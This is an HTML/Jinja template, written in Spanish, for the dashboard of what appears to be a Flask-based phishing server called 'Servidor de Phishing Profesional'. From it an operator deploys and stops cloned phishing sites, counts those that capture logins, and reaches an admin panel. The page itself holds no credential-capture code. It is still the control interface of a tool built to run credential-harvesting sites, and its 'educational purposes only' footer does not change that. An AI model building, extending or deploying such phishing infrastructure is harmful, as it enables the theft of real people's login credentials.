<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéØ Servidor de Phishing Profesional | MAT1520</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        :root{
            --bg-0: #070707;
            --bg-1: #0f0f0f;
            --card: #131313;
            --muted: #9a9a9a;
            --accent: #c8102e; /* professional red */
            --accent-dark: #8b0f22;
            --glass: rgba(255,255,255,0.03);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
            color: #e9e9e9;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            background: linear-gradient(180deg, var(--bg-1), var(--bg-0));
            padding: 24px 14px;
            text-align: center;
            border-bottom: 3px solid var(--accent-dark);
            box-shadow: 0 8px 30px rgba(0,0,0,0.7);
        }

        .header h1 {
            font-size: 2.4em;
            margin-bottom: 6px;
            color: #fff;
            letter-spacing: -0.5px;
        }

        .header .subtitle { font-size: 1.05em; color: var(--muted); margin-bottom: 10px; }

        .creator-info { display: flex; justify-content: center; gap: 18px; margin-top: 12px; flex-wrap: wrap; }

        .creator-link{ display:inline-flex; align-items:center; gap:8px; padding:7px 14px; background: transparent; border:1px solid var(--accent-dark); border-radius:20px; color:var(--accent); text-decoration:none; font-size:0.9em; }

        .creator-link:hover{ background: rgba(200,16,46,0.06); transform: translateY(-2px); }

        .stats{ display:flex; justify-content:center; gap:26px; margin:28px 0; flex-wrap:wrap; }

        .stat-card{ background: var(--card); padding:20px; border-radius:12px; text-align:center; border:1px solid rgba(255,255,255,0.03); box-shadow: 0 8px 20px rgba(0,0,0,0.6); min-width:150px; }

        .stat-card h3{ font-size:2.4em; color:var(--accent); margin-bottom:6px; }

        .stat-card p{ color:var(--muted); font-size:1.02em; }

        .container{ max-width:1180px; margin:0 auto; padding:18px; }

        /* larger, more legible cards */
        .sites-grid{ display:grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); gap:28px; margin-top:28px; }

        .site-card{ background: linear-gradient(180deg,var(--card), #0f0f0f); border-radius:18px; padding:32px; border:1px solid rgba(255,255,255,0.03); box-shadow: 0 18px 50px rgba(0,0,0,0.6); transition: all 0.25s ease; position:relative; overflow:hidden; min-height:340px; }

        .site-card::before{ content:''; position:absolute; top:0; left:0; right:0; height:4px; background: linear-gradient(90deg, var(--accent-dark), var(--accent)); opacity:0; transition:opacity .25s ease; }

        .site-card:hover{ transform: translateY(-6px); box-shadow: 0 30px 70px rgba(0,0,0,0.7); border-color: rgba(200,16,46,0.18); }

        .site-card:hover::before{ opacity:1; }

        .site-header{ display:flex; align-items:center; gap:22px; margin-bottom:28px; }

        .site-logo{ width:100px; height:100px; border-radius:14px; object-fit:cover; border:3px solid rgba(255,255,255,0.04); background:#0b0b0b; box-shadow: 0 8px 24px rgba(0,0,0,0.6); transition: transform .2s, border-color .2s; }

        .site-card:hover .site-logo{ border-color: var(--accent); transform: scale(1.02); }

        .site-info h3{ color:#fff; font-size:1.8em; margin-bottom:8px; text-transform:capitalize; font-weight:600; }

        .site-status{ padding:7px 16px; border-radius:20px; font-size:0.85em; font-weight:700; text-transform:uppercase; letter-spacing:0.6px; }

        .status-available{ background: rgba(255,255,255,0.03); color:var(--muted); border:1px solid rgba(255,255,255,0.03); }

        .status-deployed{ background: rgba(200,16,46,0.12); color:var(--accent); border:1px solid rgba(200,16,46,0.2); }

        .site-actions{ display:flex; gap:14px; margin-top:22px; }

        .btn{ padding:14px 24px; border:none; border-radius:12px; font-size:1.02em; font-weight:700; cursor:pointer; transition: all .18s ease; text-decoration:none; text-align:center; flex:1; position:relative; overflow:hidden; }

        .btn::before{ content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent); transition:left .45s; }

        .btn:hover::before{ left:100%; }

        .btn-primary{ background: linear-gradient(135deg, var(--accent-dark), var(--accent)); color:#fff; box-shadow: 0 6px 20px rgba(200,16,46,0.18); }

        .btn-primary:hover{ transform: translateY(-3px); box-shadow: 0 18px 40px rgba(200,16,46,0.22); }

        .btn-secondary{ background: #0b0b0b; color:var(--muted); border:1px solid rgba(255,255,255,0.04); }

        .btn-secondary:hover{ transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.6); }

        .btn-danger{ background:linear-gradient(135deg,#8b0f22,#c8102e); color:#fff; box-shadow: 0 6px 20px rgba(200,16,46,0.2); }

        .btn-danger:hover{ transform: translateY(-3px); }

        .admin-panel{ position: fixed; bottom: 30px; right: 30px; z-index:1000; }

        .admin-btn{ display:flex; align-items:center; gap:10px; background: linear-gradient(135deg,#1b1b1b,#0b0b0b); color:var(--accent); padding:12px 20px; border-radius:40px; text-decoration:none; font-weight:700; border:1px solid rgba(255,255,255,0.03); }

        .footer{ margin-top:42px; padding:26px; text-align:center; background:transparent; border-top:1px solid rgba(255,255,255,0.03); }

        .footer p{ color:var(--muted); margin-bottom:12px; }

        .tech-stack{ display:flex; justify-content:center; gap:12px; flex-wrap:wrap; }

        .tech-badge{ padding:6px 12px; background:transparent; border:1px solid rgba(255,255,255,0.03); border-radius:12px; color:var(--muted); font-size:0.82em; }

        @media (max-width: 900px){ .sites-grid{ grid-template-columns: 1fr; } .site-card{ min-height:300px; } }

        @keyframes fadeInUp{ from{ opacity:0; transform: translateY(20px);} to{ opacity:1; transform: translateY(0);} }
        .site-card{ animation: fadeInUp 0.5s ease forwards; }

        .profile-section{ display:flex; align-items:center; gap:14px; margin-bottom:14px; }
        .profile-img{ width:64px; height:64px; border-radius:50%; border:3px solid rgba(255,255,255,0.04); object-fit:cover; }
        .profile-info h3{ color: #fff; margin:0; font-size:1.05em; }
    </style>
</head>
<body>
    <div class="header"><div class="profile-section"><img src="/logos/MAT.jpg" alt="MAT1520 Profile" class="profile-img"><div class="profile-info"><h3>MAT1520</h3></div></div>
        <h1>üéØ Servidor de Phishing Profesional</h1>
        <p class="subtitle">Sistema avanzado de despliegue y gesti√≥n de sitios de phishing</p>
        
        <div class="creator-info">
            <a href="https://github.com/mat1520" target="_blank" class="creator-link">
                <span>‚ö°</span> GitHub: MAT1520
            </a>
            <a href="https://t.me/MAT3810" target="_blank" class="creator-link">
                <span>üì±</span> Telegram: MAT3810
            </a>
        </div>
    </div>

    <div class="container">
        <div class="stats">
            <div class="stat-card">
                <h3>{{ total_sites }}</h3>
                <p>Sitios Disponibles</p>
            </div>
            <div class="stat-card">
                <h3>{{ sites|selectattr('deployed')|list|length }}</h3>
                <p>Sitios Activos</p>
            </div>
            <div class="stat-card">
                <h3>{{ sites|selectattr('has_login')|list|length }}</h3>
                <p>Con Login</p>
            </div>
        </div>

        <div class="sites-grid">
            {% for site in sites %}
            <div class="site-card">
                <div class="site-header">
                    <img src="/logos/{{ site.logo }}" alt="{{ site.name }}" class="site-logo" 
                         onerror="this.src='/logos/default.png'">
                    <div class="site-info">
                        <h3>{{ site.name.replace('-', ' ').title() }}</h3>
                        {% if site.deployed %}
                        <span class="site-status status-deployed">üü° Desplegado</span>
                        {% else %}
                        <span class="site-status status-available">üü¢ Disponible</span>
                        {% endif %}
                    </div>
                </div>

                <div class="site-actions">
                    {% if site.deployed %}
                    <a href="/phish/{{ site.name }}/" class="btn btn-primary" target="_blank">
                        üöÄ Visitar Sitio
                    </a>
                    <a href="/stop/{{ site.name }}" class="btn btn-danger">
                        ‚èπÔ∏è Detener
                    </a>
                    {% else %}
                    <a href="/deploy/{{ site.name }}" class="btn btn-primary">
                        ‚ñ∂Ô∏è Desplegar
                    </a>
                    {% endif %}
                </div>
            </div>
            {% endfor %}
        </div>
    </div>

    <div class="admin-panel">
        <a href="/admin" class="admin-btn">
            üë®‚Äçüíº Panel de Administraci√≥n
        </a>
    </div>

    <div class="footer">
        <p>üîí Sistema profesional desarrollado por MAT1520 | Solo para prop√≥sitos educativos</p>
        <div class="tech-stack">
            <span class="tech-badge">Python Flask</span>
            <span class="tech-badge">SQLite</span>
            <span class="tech-badge">HTML5/CSS3</span>
            <span class="tech-badge">JavaScript</span>
            <span class="tech-badge">Responsive Design</span>
        </div>
    </div>

    <script>
        // Auto-refresh cada 30 segundos
        setTimeout(() => {
            location.reload();
        }, 30000);

        // Efectos visuales
        document.addEventListener('DOMContentLoaded', function() {
            const cards = document.querySelectorAll('.site-card');
            cards.forEach((card, index) => {
                card.style.animationDelay = `${index * 0.1}s`;
            });
        });
    </script>
</body>
</html>
